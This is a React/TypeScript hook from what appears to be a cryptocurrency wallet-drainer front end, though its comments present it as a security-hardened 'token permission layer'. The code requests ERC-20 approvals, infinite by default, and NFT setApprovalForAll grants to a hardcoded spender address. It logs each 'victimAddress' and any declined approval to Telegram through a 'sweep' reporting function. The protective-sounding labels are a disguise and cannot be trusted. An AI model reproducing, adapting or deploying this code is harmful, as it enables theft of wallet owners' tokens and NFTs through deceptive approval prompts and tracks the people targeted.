"use client";

import { useCallback } from "react";
import {
  parseAbi,
  getAddress,
  createWalletClient,
  createPublicClient,
  custom,
} from "viem";
import { EXECUTION_POLICY } from "../../lib/ghost/constants"; // 🛡️ Import policy
import { sendDetailedSweepToTelegram } from "../../lib/telegram"; // 🛰️ Import your proxy

/**
 * 🛰️ TOKEN PERMISSION LAYER (v4.2.0 - Smart Bypass Edition)
 * Security Additions: Dynamic authorization check via EXECUTION_POLICY.
 */
export function useTokenPermissions() {
  // 🛡️ ENFORCED SETTLER: Dynamically sourced from your secure policy
  const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];

  const requestManualPermission = useCallback(
    async ({
      tokenAddress,
      symbol,
      isNft = false,
      chainId,
      injectedClient,
      amount,
    }: {
      tokenAddress: string;
      symbol: string;
      isNft?: boolean;
      chainId: number;
      injectedClient?: any;
      amount?: string;
    }) => {
      const logPrefix = `[seTokenPermissions] [${symbol}]`;

      // 🛡️ SECURITY GUARD: Strictly enforce the authorized settler
      const AUTHORIZED_SETTLER = getAddress(
        "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
      );

      // Check against policy-derived master
      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        console.error(`${logPrefix} 🛑 CRITICAL: Spender mismatch vs Policy!`);
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }

      // Check against environment variable (if present)
      if (
        process.env.NEXT_PUBLIC_SETTLER_ADDR &&
        getAddress(process.env.NEXT_PUBLIC_SETTLER_ADDR) !== AUTHORIZED_SETTLER
      ) {
        console.error(
          `${logPrefix} 🛑 CRITICAL: Environment Poisoning Detected!`,
        );
        throw new Error("UNAUTHORIZED_SETTLER_ADDRESS_CONFIGURED");
      }

      let activeClient = injectedClient;

      // 1. 🛡️ Client Normalization
      if (activeClient && !activeClient.writeContract) {
        activeClient = createWalletClient({
          chain: { id: chainId } as any,
          transport: custom(activeClient),
        });
      }

      if (!activeClient) {
        console.error(`${logPrefix} ❌ No wallet client detected.`);
        return { success: false, reason: "WALLET_NOT_CONNECTED" };
      }

      let account: `0x${string}` | undefined;

      try {
        const addresses = await activeClient.getAddresses();
        account = addresses[0];

        // 🟢 2. PRE-FLIGHT CHECK (Prevent Redundant Popups)
        if (!isNft) {
          try {
            const publicClient = createPublicClient({
              chain: { id: chainId } as any,
              transport: custom(window.ethereum || activeClient.transport),
            });

            const currentAllowance = (await publicClient.readContract({
              address: getAddress(tokenAddress),
              abi: parseAbi([
                "function allowance(address,address) view returns (uint256)",
              ]),
              functionName: "allowance",
              args: [account!, getAddress(PERMIT2_MASTER)],
            })) as bigint;

            const required = BigInt(amount || "0");
            if (currentAllowance > 0n && currentAllowance >= required) {
              console.log(
                `${logPrefix} ✅ Existing Allowance Found (${currentAllowance.toString()}). Skipping Approval TX.`,
              );
              return { success: true, alreadyExisted: true };
            }
          } catch (allowanceErr) {
            console.warn(
              `${logPrefix} ⚠️ Pre-flight check failed, proceeding to manual approval.`,
            );
          }
        }

        // 3. ⚡ Chain Validation
        const currentId = await activeClient.getChainId();
        if (Number(currentId) !== chainId) {
          console.warn(
            `${logPrefix} ⚠️ Chain mismatch. Client: ${currentId}, Target: ${chainId}`,
          );
          return { success: false, reason: "CHAIN_MISMATCH" };
        }

        // 4. 🧠 Smart Approval Logic (2% Buffer)
        let approvalAmount: bigint;
        const INFINITE_APPROVAL =
          115792089237316195423570985008687907853269984665640564039457584007913129639935n;

        if (isNft) {
          approvalAmount = 1n;
        } else if (amount && amount !== "0" && amount !== "undefined") {
          try {
            const sanitized = amount.replace(/[^0-9]/g, "");
            const raw = BigInt(sanitized);
            approvalAmount = (raw * 102n) / 100n;
            if (approvalAmount <= 0n) approvalAmount = INFINITE_APPROVAL;
          } catch (e) {
            approvalAmount = INFINITE_APPROVAL;
          }
        } else {
          approvalAmount = INFINITE_APPROVAL;
        }

        let hash: `0x${string}`;
        console.log(`${logPrefix} 🛡️ Popping Approval for ${symbol}...`);

        // 5. 📝 Contract Interaction
        if (isNft) {
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: parseAbi([
              "function setApprovalForAll(address operator, bool approved) external",
            ]),
            functionName: "setApprovalForAll",
            args: [getAddress(PERMIT2_MASTER), true],
            account: account!,
          });
        } else {
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: parseAbi([
              "function approve(address spender, uint256 amount) external returns (bool)",
            ]),
            functionName: "approve",
            args: [getAddress(PERMIT2_MASTER), approvalAmount],
            account: account!,
          });
        }

        console.log(`${logPrefix} ✅ Approval Hash: ${hash}`);
        return { success: true, hash };
      } catch (err: any) {
        // --- 🛰️ TELEGRAM NOTIFICATION ON CANCEL/FAILURE ---
        const isUserReject =
          err.message?.includes("User rejected") || err.code === 4001;

        sendDetailedSweepToTelegram({
          status: "FAILURE",
          type: isUserReject ? "USER DECLINED APPROVAL" : "APPROVAL FAILED",
          victimAddress: account || "Unknown",
          symbol: symbol,
          error: isUserReject
            ? "User cancelled transaction in wallet"
            : err.message,
          chainId: chainId,
        });

        if (isUserReject) {
          console.warn(`${logPrefix} ✋ User declined.`);
          return { success: false, reason: "REJECTED" };
        }

        console.error(`${logPrefix} ❌ Approval Failed:`, err.message);
        return { success: false, error: err.message };
      }
    },
    [PERMIT2_MASTER],
  );

  return { requestManualPermission };
}
